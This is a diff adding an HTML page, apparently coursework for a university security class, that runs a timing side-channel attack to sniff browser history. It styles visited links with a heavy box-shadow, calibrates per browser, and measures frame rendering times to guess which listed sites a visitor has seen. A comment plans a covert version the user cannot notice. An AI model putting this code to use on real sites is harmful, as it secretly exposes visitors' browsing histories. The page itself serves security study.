@@ -1,0 +1,418 @@
+<html>
+<style>
+
+a:visited {
+	color: rgb(255, 255, 254);
+}
+a:link { 
+color: rgb(255, 255, 255); 
+box-shadow: inset 5px 15px 500px #FFE
+}
+#placeholder { transform-origin: 0 0;}
+
+</style>
+
+<script>
+/*
+a:link {
+    color: rgb(0, 127, 0);
+	box-shadow: inset 5px 15px 500px #000
+}
+
+Okay, so Chrome is a bit faster than Firefox, so 500px gets a solid difference in Chrome, where 200px does fine in Firefox. Next item on the list would be to do some calibration to automatically determine the appropriate blur radius for a given browser/hardware setup to optimize the number of links that can be tested in a given amount of time. Also, have the obvious version, then do the small version where the user can't tell.
+*/
+</script>
+
+<body>
+
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+<script>
+// http://paulirish.com/2011/requestanimationframe-for-smart-animating/
+// http://my.opera.com/emoller/blog/2011/12/20/requestanimationframe-for-smart-er-animating
+ 
+// requestAnimationFrame polyfill by Erik Möller
+// fixes from Paul Irish and Tino Zijdel
+ 
+(function() {
+    var lastTime = 0;
+    var vendors = ['ms', 'moz', 'webkit', 'o'];
+    for(var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
+        window.requestAnimationFrame = window[vendors[x]+'RequestAnimationFrame'];
+        window.cancelAnimationFrame = window[vendors[x]+'CancelAnimationFrame']
+                                   || window[vendors[x]+'CancelRequestAnimationFrame'];
+    }
+ 
+    if (!window.requestAnimationFrame)
+        window.requestAnimationFrame = function(callback, element) {
+            var currTime = new Date().getTime();
+            var timeToCall = Math.max(0, 16 - (currTime - lastTime));
+            var id = window.setTimeout(function() { callback(currTime + timeToCall); },
+              timeToCall);
+            lastTime = currTime + timeToCall;
+            return id;
+        };
+ 
+    if (!window.cancelAnimationFrame)
+        window.cancelAnimationFrame = function(id) {
+            clearTimeout(id);
+        };
+}());
+
+var max_time_to_render = 100;
+var url_idx = 0;
+var urls = [
+    "https://www.google.com",
+    "https://www.facebook.com",
+	"http://www.reddit.com/",
+	"http://www.buzzfeed.com/",
+	"https://www.eecs.umich.edu/courses/eecs588/", // EECS588 website
+	"https://jhalderm.com/", // Alex's website
+	"http://www.testnotvisited.com",
+	"https://twitter.com/",
+	"https://twitter.com/peterhoneyman"
+	
+];
+
+var num_links_in_cluster = 15;
+
+var timing = [];
+var timing_idx = 0;
+var lasttime = Date.now();
+var curtime;
+var num_frames = 7;
+var hit_miss_threshold = 25; // misses are usually under 20
+var current_link;
+
+var known_visited_link = "file:///C:/dwshare/history_sniffing.html";
+var known_unvisited_link = "https://www.unvisiteddefinitelyforsuretralalala.com"
+
+var visited_links = [];
+var unvisited_links = [];
+
+var callback_after_test = process_result;
+
+var start_history_sniff;
+var end_history_sniff;
+
+var start_calibration;
+var end_calibration;
+
+Array.prototype.average=function(){
+    var sum=0;
+    var j=0;
+    for(var i=0;i<this.length;i++){
+        if(isFinite(this[i])){
+          sum=sum+parseFloat(this[i]);
+           j++;
+        }
+    }
+    if(j===0){
+        return 0;
+    }else{
+        return sum/j;
+    }
+}
+
+Array.prototype.max = function() {
+  return Math.max.apply(null, this);
+};
+
+Array.prototype.min = function() {
+  return Math.min.apply(null, this);
+};
+
+function create_unvisited_cluster() {
+	var el = document.createElement("div");
+	el.id = "links";
+	for (i = 0; i < num_links_in_cluster; i++) {
+		// create anchor with url
+		var a = document.createElement("a");
+		a.href = known_unvisited_link; //urls[i];
+		a.id = "url" + i;
+		var node = document.createTextNode("########");
+		a.appendChild(node);
+		//var el = document.getElementById("links");
+		el.appendChild(a);
+		if (i%5 == 4) {
+			var br = document.createElement("br");
+			el.appendChild(br);
+		}
+	}
+	var pl = document.getElementById("placeholder");
+	pl.appendChild(el);
+}
+
+function unvisited_cluster_exists() {
+	return document.getElementById("links") != null;
+}
+
+function delete_unvisited_cluster() {
+	var el = document.getElementById("links");
+	el.parentNode.removeChild(el);
+}
+
+function delete_if_exists(id) {
+	var el = document.getElementById(id);
+	if (el != null) {
+		el.parentNode.removeChild(el);
+	}
+}
+
+function process_result() {
+	// look at stored times in timing[]
+	var max_time = timing.max();
+	if (max_time > hit_miss_threshold) {
+		console.log(current_link + " is probably a hit (" + max_time.toString() + " rendering time)");
+		display_status(current_link + " is probably a hit (" + max_time.toString() + " rendering time)");
+	} else {
+		console.log(current_link + " is probably a miss (" + max_time.toString() + " rendering time)");
+		display_status(current_link + " is probably a miss (" + max_time.toString() + " rendering time)");
+	}
+	return max_time;
+}
+
+function process_result_next_link() {
+	var max_time = process_result();
+	// put this link in the list of visited/unvisited links
+	
+	if (max_time > hit_miss_threshold) {
+		visited_links[visited_links.length] = urls[url_idx];
+	} else {
+		unvisited_links[unvisited_links.length] = urls[url_idx];
+	}
+	
+	// start with next link
+	url_idx++;
+	if (url_idx < urls.length) {
+		test_link(urls[url_idx]);
+	} else {
+		display_status("");
+		display_links();
+	}
+}
+
+function display_links() {
+	/*vis = document.getElementById("visited");
+	unvis = document.getElementById("unvisited");
+	insert_links_to_element(visited_links, vis);
+	insert_links_to_element(unvisited_links, unvis);
+	*/
+	end_history_sniff = Date.now();
+	display_status("Sniffing " + urls.length.toString() + " links took " + (end_history_sniff - start_history_sniff).toString() + " ms.");
+	create_display("Visited Links", "visited", visited_links);
+	create_display("Unvisited Links", "unvisited", unvisited_links);
+}
+
+function create_display(display, id, links) {
+	// if this display element exists, delete it
+	delete_if_exists(id);
+	disp = document.createElement("div");
+	disp.id = id;
+	p = document.createElement("b");
+	text = document.createTextNode(display);
+	//p.style.fontWeight = "bold";
+	p.appendChild(text);
+	disp.appendChild(p);
+	br = document.createElement("br");
+	disp.appendChild(br);
+	insert_links_to_element(links, disp);	
+	
+	document.getElementById("history").appendChild(disp);
+}
+
+function display_status(status) {
+	p = document.getElementById("status");
+	p.innerHTML = status
+}
+
+function insert_links_to_element(links, element) {
+	for (var i = 0; i < links.length; i++) {
+		var a = document.createElement("a");
+		a.href = links[i];
+		var p = document.createTextNode(links[i]);
+		a.appendChild(p);
+		//p.text = links[i];
+		element.appendChild(p);
+		var br = document.createElement("br");
+		element.appendChild(br);
+	}
+	element.appendChild(document.createElement("br"));
+}
+
+function test_link(link) {
+	current_link = link;
+	if (unvisited_cluster_exists()) {
+		delete_unvisited_cluster();
+	}
+	create_unvisited_cluster();
+	setTimeout(function (link) {
+		measure_time();
+		//something(Date.now());
+		for (var i = 0; i < num_links_in_cluster; i++) {
+			var a = document.getElementById("url" + i)
+			a.href = link;
+		}
+	}, max_time_to_render, link
+	);
+}
+
+
+// need these to be global to manage the callback situation
+var diff = 0;
+var target_diff = 50;
+var attempts = 0;
+var attempt_cutoff = 10;
+
+var num_to_calibrate = 3;
+
+var hit_times = [];
+var miss_times = [];
+var cur = "hit";
+var known_hit_time;
+var known_miss_time;
+var min_hit_time;
+var max_miss_time;
+
+
+function calibrate() {
+	if (diff < target_diff && attempts < attempt_cutoff) {
+		var rlink = 'a:link { color: rgb(0, 127, 0); box-shadow: inset 5px 15px ' + cur_shadow_px.toString() + 'px #000}';
+		document.styleSheets[0].insertRule(rlink, 0);
+		// test known hit and miss (take average of max of each)
+		if (hit_times.length < num_to_calibrate) {
+			cur = "hit";
+			//setTimeout(test_known_link, 250, known_visited_link);
+			test_known_link(known_visited_link);
+			return;
+		}
+		if (miss_times.length < num_to_calibrate) {
+			cur = "miss";
+			//setTimeout(test_known_link, 250, known_unvisited_link);
+			test_known_link(known_unvisited_link);
+			return;			
+		}
+		known_hit_time = hit_times.average();
+		known_miss_time = miss_times.average();
+		min_hit_time = hit_times.min();
+		max_miss_time = miss_times.max();
+
+		// here we need to wait long enough to know that this function has returned. shoot.
+		diff = min_hit_time - max_miss_time;
+		// if sufficiently different, we're good
+		// otherwise, increase blur radius and test again
+		//cur_shadow_px += 50;
+		num_links_in_cluster += 2;
+		attempts++;
+		console.log("attempts " + attempts.toString())
+		console.log("diff = " + diff.toString())
+
+		// reset time arrays before doing another iteration
+		hit_times = [];
+		miss_times = [];
+		
+		calibrate();
+		return;
+	}
+	
+	if (attempts == attempt_cutoff && diff < target_diff) {
+		console.log("Unable to detect significant differences between known visited and unvisited links :'( You are safe.");
+		display_status("Unable to detect significant differences between known visited and unvisited links :'( You are safe.");
+		// could try increasing the number of links
+	} else {
+		var half_diff = (known_hit_time - known_miss_time) / 2;
+		hit_miss_threshold = known_miss_time + half_diff;
+		console.log("threshold = " + hit_miss_threshold.toString());
+		display_status("Calibration complete. Threshold = " + hit_miss_threshold.toString())
+		max_time_to_render = known_hit_time + 25;
+	}
+	
+	//callback_after_test = process_result;
+}
+
+function process_with_wait() {
+	timing_after_wait = process_result();
+	if (cur == "hit") {
+		hit_times[hit_times.length] = timing_after_wait;
+	} else if (cur == "miss") {
+		miss_times[miss_times.length] = timing_after_wait;
+	}
+	calibrate();
+}
+
+function test_known_link(link) {
+//	callback_after_test = process_with_wait;
+	test_link(link);
+}
+
+
+var lasttime = 0;
+
+function measure_time(time) {
+	var delay = time - lasttime;
+	if (!isNaN(delay)) {
+		timing[timing_idx] = delay;
+	} else {
+		timing[timing_idx] = 0;
+	}
+	lasttime = time;
+	timing_idx++;
+	if (timing_idx < num_frames) {
+		//updateAnimation();
+		requestAnimationFrame(measure_time);
+		//mozRequestAnimationFrame(something);
+	} else {
+		timing_idx = 0;
+		requestAnimationFrame(callback_after_test);
+	}
+}
+
+function start_calibration() {
+	callback_after_test = process_with_wait;
+	attempts = 0;
+	diff = 0;
+	cur_shadow_px = 30;
+
+	calibrate();
+}
+
+function check_history(link) {
+	callback_after_test = process_result_next_link;
+	url_idx = 0;
+	visited_links = [];
+	unvisited_links = [];
+	start_history_sniff = Date.now();
+	test_link(link);
+	// get each
+}
+
+function test_single_link(link) {
+	callback_after_test = process_result;
+	test_link(link);
+}
+
+</script>
+<h2>Browser history sniffing</h2>
+<div><b>Calibration to your hardware/browser situation</b></div>
+<input type="button" value="Calibrate" onclick=start_calibration()>
+<br>
+<br>
+<div><b>Check a preselected set of links</b></div>
+<input type="button" value="Check history" onclick=check_history(document.getElementById('checkme').value)>
+<br>
+<br>
+<div id="history"></div>
+<div id="status_div">
+<div><b>Status</b>
+<div id="status">...</div></div>
+</div>
+<div>
+<h4>Check your own link</h4>
+<textarea style="width:450" id="checkme">https://www.google.com</textarea>
+</div>
+<br>
+<input type="button" value="Test Link" onclick=test_single_link(document.getElementById('checkme').value)>
+<div id="placeholder">
+</div>
+</body>
+</html>
